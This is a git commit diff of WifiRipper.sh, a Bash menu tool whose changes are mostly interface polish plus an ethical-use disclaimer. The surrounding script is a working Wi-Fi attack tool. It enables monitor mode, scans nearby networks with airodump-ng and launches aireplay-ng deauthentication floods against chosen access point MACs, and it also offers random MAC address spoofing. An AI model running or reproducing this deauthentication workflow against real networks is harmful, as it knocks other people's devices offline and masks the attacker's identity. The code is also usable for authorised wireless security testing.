bc1f3f826920e6d3fbc0a0758661b40dd590d35e
Joel Patrick <141442170+H3LLK1TTY@users.noreply.github.com>
2023-08-15 00:24:39 +0530

    Update 2.4.1
    Update:
    Improvised UI
    Added Exit key in Readme and About tool 
    Updated Smooth loading of launcher
    Updated font boldness and font color: Green

--- WifiRipper.sh
+++ WifiRipper.sh
@@ -14,16 +14,18 @@ show_loading() {
   local duration="$1"
   local interval=0.2
   local symbols=("+" "*" "+" "*")
-  local color=("\\e[92m" "\\e[92m" "\\e[92m" "\\e[92m")  
+  local color=("\\033[1;92m")  
 
   for ((i = 0; i < duration * 5; i++)); do
     local symbol="${symbols[i % 4]}"
     local color="${colors[i % 4]}"
-    echo -ne "${color}Loading... $symbol\\e[0m\r" 
+    echo -ne "${color}Loading... $symbol\\e[0m\r"  
     sleep "$interval"
   done
 }
 show_loading 5
+echo -e "\033[1;92m"
+clear
 echo "Loading complete!"
 sleep 2
 clear
@@ -36,32 +38,34 @@ chmod +x Banner.sh
 bash launcher.sh
 sleep 5
 echo " Please wait..."
-
 function show_interfaces() {
   bash Banner.sh
-  echo "Connected Network Interfaces:"
-  echo "----------------------------"
+  echo -e "\n\n\n"
+  echo "       MAC Address Changer"
+  echo -e "       ------------------------------------------------------------------------------------------------------------------------\n"
+  echo -e "           Connected Network Interfaces:\n"
   interfaces=($(ip link show | awk '/^[0-9]+:/ {print substr($2, 1, length($2)-1)}' | grep -v lo))
   for ((i=0; i<${#interfaces[@]}; i++)); do
-    echo "$((i+1)). ${interfaces[i]}"
+    echo "           $((i+1)). ${interfaces[i]}"
   done
 }
 
 function change_mac_address_random() {
-  read -p "Enter the number corresponding to the network interface to change the MAC address: " num
+  echo -e "\n"
+  read -p "           Enter the number corresponding to the network interface to change the MAC address: " num
 
   # Validate the input
   re='^[0-9]+$'
   if ! [[ $num =~ $re ]]; then
-    echo "Invalid input. Please enter a valid number corresponding to the interface."
+    echo "           Invalid input. Please enter a valid number corresponding to the interface."
     return
   fi
 
   if (( num < 1 || num > ${#interfaces[@]} )); then
-    echo "Invalid input. Please enter a number within the range of available interfaces."
+    echo "           Invalid input. Please enter a number within the range of available interfaces."
     return
   fi
-
+  
   selected_interface=${interfaces[$((num-1))]}
   new_mac=$(printf "%02X:%02X:%02X:%02X:%02X:%02X" $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
 
@@ -69,51 +73,88 @@ function change_mac_address_random() {
   sudo ip link set dev $selected_interface address $new_mac
   sudo ip link set dev $selected_interface up
 
-  echo "MAC address for $selected_interface changed to $new_mac."
-  echo "Redirecting in 5s"
+  echo -e "           MAC address for $selected_interface changed to $new_mac.\n"
+  echo "           Redirecting in 5s"
+}
+
+function readme() {
+     bash Banner.sh
+     cat < README.md
+        while true; do
+                echo " "
+                read -p "           Press X to exit to menu: " repeat
+                case $repeat in
+                 [Xx]* )
+                        clear
+                        return ;;
+                    * )
+                        echo "           Invalid response. Please enter 'X'." ;;
+                esac
+            done
+}
+
+function manual() {
+     bash Banner.sh
+     cat < Manual.md
+        while true; do
+                echo " "
+                read -p "           Press X to exit to menu: " repeat
+                case $repeat in
+                 [Xx]* )
+                        clear
+                        return ;;
+                    * )
+                        echo "           Invalid response. Please enter 'X'." ;;
+                esac
+            done    
 }
 
 function deauthenticate() {
     for mac in "${mac_addresses[@]}"; do
         gnome-terminal -- bash -c "aireplay-ng -0 $deauth_packets -a $mac -D $interface; read -p 'Press Enter to close this terminal window...' sudo airmon-ng stop $interface "
     done
-    echo "Deauthentication completed for selected MAC addresses."
+    echo -e "\n           Deauthentication completed for selected MAC addresses."
 }
 
 function scan_and_deauthenticate() {
     clear
     while true; do
         bash Banner.sh
-        echo "Available wireless network interfaces:"
-        echo "0 - Go Back"
+        echo -e "\n\n\n\n            + Select your wireless Interface(Adapter)  "
+        echo "            + Monitor mode will be enabled on the selected Interface  "
+        echo "            + Pres Ctrl & C to stop scanning "
+        echo -e "\n\n\n       Scan and Deauthenticate"
+        echo -e "       ------------------------------------------------------------------------------------------------------------------------\n"
+        echo -e "           Available wireless network interfaces:\n"
+        echo "           0 - Go Back"
         index=1
         for iface in $(ip link show | awk -F: '$0 !~ "lo|vir|^[^0-9]"{print $2;getline}'); do
             if [[ -n $(iwconfig $iface 2>/dev/null | grep "IEEE") ]]; then
                 chipset_info=$(ethtool -i $iface | grep driver)
                 chipset_name=$(echo $chipset_info | awk '{print $2}')
                 manufacturer=$(echo $chipset_info | awk '{print $4}')
-                echo "$index - $iface - $manufacturer $chipset_name"
+                echo -e "\n           $index - $iface - $manufacturer $chipset_name"
                 wireless_interfaces[$index]=$iface
                 ((index++))
             fi
         done
 
         if [[ ${#wireless_interfaces[@]} -eq 0 ]]; then
-            echo "No wireless interface detected"
-            echo ":("
+            echo "           No wireless interface detected"
+            echo "           :("
             sleep 3
             clear
         fi
 
-        echo "Select a wireless interface:"
-        read -p "(Enter a number or '0' to Go Back): " choice
+        echo -e "\n       Select a wireless interface:"
+        read -p "       (Enter a number or '0' to Go Back): " choice
         if [[ $choice -ge 0 && $choice -le ${#wireless_interfaces[@]} ]]; then
             if [[ $choice -eq 0 ]]; then
                 clear
                 return
             fi
             interface=${wireless_interfaces[$choice]}
-            echo "Switching to monitor mode..."
+            echo -e "\n          Switching to monitor mode..."
             sudo ifconfig $interface down
             sudo airmon-ng start $interface
             new_interface="${interface}mon"
@@ -121,16 +162,18 @@ function scan_and_deauthenticate() {
                 interface=$new_interface
             fi
             sudo ifconfig $interface up
-            echo "Monitor mode enabled on $interface"
-            echo -e "Scanning for nearby Wi-Fi networks..."
+            echo -e "           Monitor mode enabled on $interface\n"
+            echo -e "           Scanning for nearby Wi-Fi networks..."
             airodump-ng $interface
 
             while true; do
-                read -p "Enter the number of MAC addresses to deauthenticate: " count
+                echo -e "\n\n"
+                echo -e "\033[1;92m       ------------------------------------------------------------------------------------------------------------------------\n"
+                read -p "           Enter the number of MAC addresses to deauthenticate: " count
                 if [[ $count =~ ^[0-9]+$ ]]; then
                     break
                 else
-                    echo "Invalid input. Please enter a number."
+                    echo -e "           Invalid input. Please enter a number."
                 fi
             done
 
@@ -138,25 +181,28 @@ function scan_and_deauthenticate() {
 
             for ((i=1; i<=$count; i++)); do
                 while true; do
-                    read -p "Enter MAC address $i: " mac
+                    echo -e "\n"
+                    read -p "           Enter MAC address $i: " mac
                     if [[ $mac =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then
                         mac_addresses+=("$mac")
                         break
                     else
-                        echo "Invalid MAC address. Please enter a valid MAC address."
+                        echo "           Invalid MAC address. Please enter a valid MAC address."
                     fi
                 done
             done
 
             while true; do
-                read -p "Do you want to set a custom number of deauthentication packets (y/n): " custom_deauth
+                echo -e " \n"
+                read -p "           Do you want to set a custom number of deauthentication packets (y/n): " custom_deauth
                 case $custom_deauth in
                     [Yy]* )
-                        read -p "Enter the custom number of deauthentication packets: " deauth_packets
+                        echo -e "\n"
+                        read -p "           Enter the custom number of deauthentication packets: " deauth_packets
                         if [[ $deauth_packets =~ ^[0-9]+$ ]]; then
                             break
                         else
-                            echo "Invalid input. Please enter a number."
+                            echo "           Invalid input. Please enter a number."
                         fi
                         ;;
                     [Nn]* )
@@ -168,7 +214,8 @@ function scan_and_deauthenticate() {
             done            
             deauthenticate
             while true; do
-                read -p "Press Q or X to exit to menu: " repeat
+                echo -e "\n"
+                read -p "           Press X to exit to menu: " repeat
                 case $repeat in
                     [Qq]* )
                         sudo airmon-ng stop $interface
@@ -179,11 +226,11 @@ function scan_and_deauthenticate() {
                         clear
                         return ;;
                     * )
-                        echo "Invalid response. Please enter 'Q' or 'X'." ;;
+                        echo "           Invalid response. Please enter 'X'." ;;
                 esac
             done
         else
-            echo "Invalid choice. Please enter a valid number."
+            echo "           Invalid choice. Please enter a valid number."
         fi
     done
 }
@@ -191,15 +238,24 @@ function scan_and_deauthenticate() {
 clear
 
 while true; do
+    spaceeleven='           '
     bash Banner.sh
-    echo "Main Menu:"
-    echo "1 - Scan and Deauthenticate"
-    echo "2 - MAC Address Changer"
-    echo "3 - Help"
-    echo "4 - About Tool"
-    echo "0 - Exit"
-    read -p "Enter your choice: " main_choice
-
+    echo " "
+    echo " "
+    echo "            + WifiRipper is intended for ethical and educational purposes only. "
+    echo "            + Unauthorized use of this script to disrupt Wi-Fi networks without proper authorization is illegal and unethical."
+    echo "            + Users are encouraged to obtain the necessary permissions and follow ethical guidelines before using this script."
+    echo "            + The script authors and maintainers are not responsible for any misuse or harm caused by its usage.    "
+    echo -e "\n\n\n\n       Main Menu:"
+    echo -e "       ------------------------------------------------------------------------------------------------------------------------\n"
+    echo -e "           1 - Scan and Deauthenticate\n"
+    echo -e "           2 - MAC Address Changer\n"
+    echo -e "           3 - Help\n"
+    echo -e "           4 - About Tool\n"
+    echo -e "           0 - Exit\n"
+    read -p "    Enter your choice: " main_choice
+    
+    
     case $main_choice in
         1 )
             scan_and_deauthenticate
@@ -211,14 +267,10 @@ while true; do
             clear
             ;;
         3 ) clear
-            cat < Manual.md
-            sleep 5
-            clear
+            manual
             ;;
         4 ) clear
-            cat < README.md
-            sleep 5
-            clear
+            readme
             ;;    
         0 )
             clear
@@ -230,6 +282,5 @@ while true; do
             ;;
     esac
 done
-
 
 
